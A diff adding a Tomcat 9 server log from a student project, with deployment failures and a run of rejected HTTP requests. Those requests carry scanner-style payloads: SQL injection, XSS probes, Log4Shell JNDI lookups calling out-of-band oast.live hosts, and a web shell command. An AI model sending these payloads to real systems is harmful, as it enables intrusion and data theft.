+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@1b410b60]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/mavenproject1/target/mavenproject1-1.0-SNAPSHOT] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 22:08:10.705 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has finished in [130] ms
+11-Jun-2023 22:08:10.706 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+11-Jun-2023 22:08:10.708 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/PRJ301_3W] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has been ignored
+11-Jun-2023 22:08:10.716 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@1ec9bd38]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/PRJ301_3W/build/web] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 22:08:10.730 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has finished in [23] ms
+11-Jun-2023 22:08:10.730 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml]
+11-Jun-2023 22:08:10.733 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/team3] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has been ignored
+11-Jun-2023 22:08:12.198 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+11-Jun-2023 22:08:12.269 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has finished in [1,539] ms
+11-Jun-2023 22:08:12.270 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples]
+11-Jun-2023 22:08:12.705 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples] has finished in [435] ms
+11-Jun-2023 22:08:12.705 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager]
+11-Jun-2023 22:08:12.759 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager] has finished in [54] ms
+11-Jun-2023 22:08:12.759 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs]
+11-Jun-2023 22:08:12.805 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs] has finished in [44] ms
+11-Jun-2023 22:08:12.806 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager]
+11-Jun-2023 22:08:12.860 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager] has finished in [53] ms
+11-Jun-2023 22:08:12.867 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 22:08:12.899 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [2534] milliseconds
+11-Jun-2023 22:11:41.868 INFO [http-nio-8082-exec-2] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:41.868 INFO [http-nio-8082-exec-8] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [/proc/self/cmdline0x0d0x0a...]
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:558)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:41.959 INFO [http-nio-8082-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:42.187 INFO [http-nio-8082-exec-1] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/gsearch.php.en?prod='prompt`document.domain`// ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:42.814 INFO [http-nio-8082-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/index.php?a=index&content=<?php%20echo%20md5('ThinkCMF')&g=g&m=Door ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:42.891 INFO [http-nio-8082-exec-18] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/wp-content/plugins/crm-perks-forms/templates/sample_file.php?%20Company=<img%20src%20onerror=alert(document.domain)>&FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:43.534 INFO [http-nio-8082-exec-11] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/?redirect=/\interact.sh ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:43.724 INFO [http-nio-8082-exec-11] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(999999999)+--+@`'` ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:43.732 INFO [http-nio-8082-exec-4] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/solr/admin/collections?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-736%7D%24%7B%3A-349}%7D.%24%7BhostName%7D.uri.ci2u8beh06lga656vh80cqfkhkeqdu5n4.oast.live%2F%7D ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:43.784 INFO [http-nio-8082-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/widgets/debug.php?a=<script>alert(document.domain)</script> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:43.785 INFO [http-nio-8082-exec-11] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-736%7D%24%7B%3A-349}%7D.%24%7BhostName%7D.uri.ci2u8beh06lga656vh80o3hbd8y37ndf9.oast.live%2F%7D ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:44.034 INFO [http-nio-8082-exec-25] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/t/index.php?action[]=aaaa ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:44.150 INFO [http-nio-8082-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/free_time_failed.cgi?err_msg=<script>alert(document.domain)</script> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:44.334 INFO [http-nio-8082-exec-28] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [user=admin&psw=MTIzNA%3D%3D0x0d0x0a...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:44.741 INFO [http-nio-8082-exec-24] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/Uploads/2R44zVdt7wvvR6w1RpPdkL2gX1Z.php7?cmd=echo+"roxyfileman"+|+rev ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:44.800 INFO [http-nio-8082-exec-12] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
